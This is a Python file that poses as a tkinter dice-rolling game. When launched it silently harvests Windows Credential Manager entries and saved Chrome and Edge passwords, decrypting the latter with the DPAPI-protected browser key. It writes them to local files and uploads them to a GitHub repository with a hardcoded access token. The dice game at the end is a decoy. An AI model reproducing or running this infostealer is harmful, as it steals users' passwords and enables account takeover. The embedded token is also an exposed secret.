from tkinter import *
from tkinter import ttk
import random
import win32cred
import os,socket,subprocess,threading;
import keyring
import json
import sqlite3
import shutil
from datetime import datetime
from Crypto.Cipher import AES
import base64
import win32crypt
import requests


#github config
ghUsername = "dirkwillemse"
ghToken = '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'
ghRepo ='File-Ripper'
ipFile = 'C:\\backup.txt' , 'C:\\backup2.txt'
ghBranch = 'master'
ghTarget = 'rips/storage.txt'
ghUrl = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips/backup.txt'
ghUrl2 = 'https://api.github.com/repos/willemsedirk/file-ripper/contents/rips/backup2.txt'
ipPath ='C:\\backup.txt' , 'C:\\backup2.txt'


def get_encryption_key():
    try:
        # Get Chrome/Edge encryption key
        local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Local State')
        if not os.path.exists(local_state_path):
            local_state_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Local State')
        
        with open(local_state_path, 'r', encoding='utf-8') as f:
            local_state = json.loads(f.read())
            encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])
            encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
            key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return key
    except Exception as e:
        print(f"Error getting encryption key: {str(e)}")
        return None

def decrypt_password(password, key):
    try:
        iv = password[3:15]
        password = password[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(password)[:-16].decode()  # Remove suffix bytes
    except Exception as e:
        print(f"Error decrypting password: {str(e)}")
        return "[Decryption Failed]"

# Function to get credentials from the Windows Credential Manager
def get_credentials():
    credentials = []
    try:
        creds = win32cred.CredEnumerate(None, 0)
        for cred in creds:
            try:
                password = cred['CredentialBlob'].decode('utf-8') if cred['CredentialBlob'] else ''
            except UnicodeDecodeError:
                password = "[Binary Data]"
            credential_info = {
                'Target': cred['TargetName'],
                'Username': cred['UserName'],
                'Type': cred['Type'],
                'Password': password
            }
            credentials.append(credential_info)
    except Exception as e:
        print(f"Error: {str(e)}")
    return credentials

def get_browser_credentials():
    browser_creds = []
    encryption_key = get_encryption_key()
    
    # Chrome
    try:
        chrome_path = os.path.join(os.environ['LOCALAPPDATA'], 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
        if os.path.exists(chrome_path):
            temp_path = os.path.join(os.environ['TEMP'], 'chrome_login_data')
            shutil.copy2(chrome_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url, username, password = row
                if username or password:
                    decrypted_password = decrypt_password(password, encryption_key) if password else ''
                    browser_creds.append({
                        'Browser': 'Chrome',
                        'URL': url,
                        'Username': username,
                        'Password': decrypted_password
                    })
            
            conn.close()
            os.remove(temp_path)
    except Exception as e:
        print(f"Chrome error: {str(e)}")

    # Edge
    try:
        edge_path = os.path.join(os.environ['LOCALAPPDATA'], 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data')
        if os.path.exists(edge_path):
            temp_path = os.path.join(os.environ['TEMP'], 'edge_login_data')
            shutil.copy2(edge_path, temp_path)
            
            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()
            cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
            
            for row in cursor.fetchall():
                url, username, password = row
                if username or password:
                    decrypted_password = decrypt_password(password, encryption_key) if password else ''
                    browser_creds.append({
                        'Browser': 'Edge',
                        'URL': url,
                        'Username': username,
                        'Password': decrypted_password
                    })
            
            conn.close()
            os.remove(temp_path)
    except Exception as e:
        print(f"Edge error: {str(e)}")

    return browser_creds

def createFile():
    # Get Windows credentials
    credentials = get_credentials()
    with open('C:\\backup2.txt', 'w') as f:
        f.write("Windows Credentials:\n")
        f.write("=" * 40 + '\n')
        for cred in credentials:
            f.write(f"Target: {cred['Target']}\n")
            f.write(f"Username: {cred['Username']}\n")
            f.write(f"Type: {cred['Type']}\n")
            f.write(f"Password: {cred['Password']}\n")
            f.write('-' * 40 + '\n')

    # Get browser credentials
    browser_creds = get_browser_credentials()
    with open('C:\\backup.txt', 'w') as f:
        f.write("Browser Credentials:\n")
        f.write("=" * 40 + '\n')
        for cred in browser_creds:
            f.write(f"Browser: {cred['Browser']}\n")
            f.write(f"URL: {cred['URL']}\n")
            f.write(f"Username: {cred['Username']}\n")
            f.write(f"Password: {cred['Password']}\n")
            f.write('-' * 40 + '\n')

createFile()

# --- HTTP Headers ---
headers = {
    "Authorization": f"token {ghToken}",
    "Accept": "application/vnd.github.v3+json"
}

# --- Get file SHA if it exists ---
def get_file_sha():
    shas = {}
    try:
        # Get SHA for first file
        response = requests.get(ghUrl, headers=headers)
        if response.status_code == 200:
            file_info = response.json()
            shas['backup'] = file_info['sha']
        else:
            shas['backup'] = None
            
        # Get SHA for second file
        response = requests.get(ghUrl2, headers=headers)
        if response.status_code == 200:
            file_info = response.json()
            shas['backup2'] = file_info['sha']
        else:
            shas['backup2'] = None
            
        return shas
    except Exception as e:
        print(f"Error getting file SHAs: {str(e)}")
        return {'backup': None, 'backup2': None}

# --- Get SHAs first ---
shas = get_file_sha()

# --- Build payload ---
# For first file
with open('C:\\backup.txt', 'rb') as f:
    content1 = base64.b64encode(f.read()).decode()

data1 = {
    "message": f"Add or update backup.txt",
    "branch": ghBranch,
    "content": content1
}

# For second file
with open('C:\\backup2.txt', 'rb') as f:
    content2 = base64.b64encode(f.read()).decode()

data2 = {
    "message": f"Add or update backup2.txt",
    "branch": ghBranch,
    "content": content2
}

# Add SHA if files exist
if shas['backup']:
    data1["sha"] = shas['backup']
if shas['backup2']:
    data2["sha"] = shas['backup2']

# --- PUT request ---
# Upload first file
upload_response1 = requests.put(ghUrl, headers=headers, json=data1)

if upload_response1.status_code == 200:
    print(f"File uploaded successfully to backup.txt!")
else:
    print(f"Failed to upload backup.txt. Status code: {upload_response1.status_code}")
    print(upload_response1.json())

# Upload second file
upload_response2 = requests.put(ghUrl2, headers=headers, json=data2)

if upload_response2.status_code == 200:
    print(f"File uploaded successfully to backup2.txt!")
else:
    print(f"Failed to upload backup2.txt. Status code: {upload_response2.status_code}")
    print(upload_response2.json())

def roll():
    dice = random.randint(1,6)
    num_label['text'] = str(dice)

root = Tk()
frm = ttk.Frame(root, padding=100)
frm.grid()
ttk.Label(frm, text="Roll the dice").grid(column=0, row=0)
ttk.Button(frm, text="Roll", command=roll).grid(column=1, row=0)
ttk.Label(frm, text="Number:").grid(column=0,row=2)
num_label = ttk.Label(frm, text="")
num_label.grid(column=1,row=2)
root.mainloop()
